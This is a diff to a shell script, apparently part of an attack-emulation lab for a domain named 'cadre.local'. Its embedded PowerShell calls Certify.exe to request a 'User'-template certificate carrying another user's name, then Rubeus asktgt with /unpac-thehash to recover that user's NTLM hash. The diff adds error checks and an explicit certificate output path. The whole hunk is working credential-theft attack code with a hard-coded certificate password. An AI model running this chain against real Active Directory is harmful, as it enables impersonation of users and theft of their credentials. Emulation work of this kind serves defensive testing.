@@ -16,12 +16,15 @@ CA="${CA:-CADRE-CA-01.cadre.local\CADRE-CA-01}"
 TARGET_USER="analyst_t2"
 
 CMD='
+$ErrorActionPreference = "Stop";
 $c = "C:\Tools\cadre-attack\Certify.exe";
 $r = "C:\Tools\cadre-attack\Rubeus.exe";
 if (-not (Test-Path $c)) { throw "Certify.exe not found" }
 if (-not (Test-Path $r)) { throw "Rubeus.exe not found" }
-& $c request /ca:"'''"${CA}"'''" /template:User /domain:"cadre.local" /dc:"'''"${DC01}"'''" /altname:'''"${TARGET_USER}"'''";
-& $r asktgt /user:'''"${TARGET_USER}"'''" /domain:cadre.local /dc:'''"${DC01}"'''" /certificate:C:\Users\analyst_t1\AppData\Local\Temp\cert.pfx /password:CertPass123 /unpac-thehash /nowrap;
+$cert = "C:\Users\analyst_t1\AppData\Local\Temp\cert.pfx";
+& $c request /ca:"'''"${CA}"'''" /template:User /domain:"cadre.local" /dc:"'''"${DC01}"'''" /altname:"'''"${TARGET_USER}"'''" /out:$cert;
+if (-not (Test-Path $cert)) { throw "cert.pfx not created" }
+& $r asktgt /user:"'''"${TARGET_USER}"'''" /domain:cadre.local /dc:"'''"${DC01}"'''" /certificate:$cert /password:CertPass123 /unpac-thehash /nowrap;
 Write-Output "T053_OK: UnPAC-the-hash attempt complete"
 '
 
